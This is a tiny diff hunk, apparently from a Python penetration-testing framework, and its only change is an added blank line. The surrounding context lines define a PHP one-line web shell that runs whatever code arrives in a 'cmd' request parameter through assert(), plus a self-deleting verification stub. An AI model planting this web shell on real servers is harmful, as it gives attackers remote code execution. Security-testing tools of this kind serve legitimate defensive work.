@@ -143,6 +143,7 @@ class PhpShell(Webshell):
     _password = 'cmd'
     _content = "<?php @assert($_REQUEST['{0}']);var_dump('202c{1}4b70')?>".format(_password, _keyword)
 
+
 class PhpVerify(VerifyShell):
     _keyword = randomStr(20)
     _content = '<?php var_dump("202c{0}4b70");unlink(__FILE__);?>'.format(_keyword)
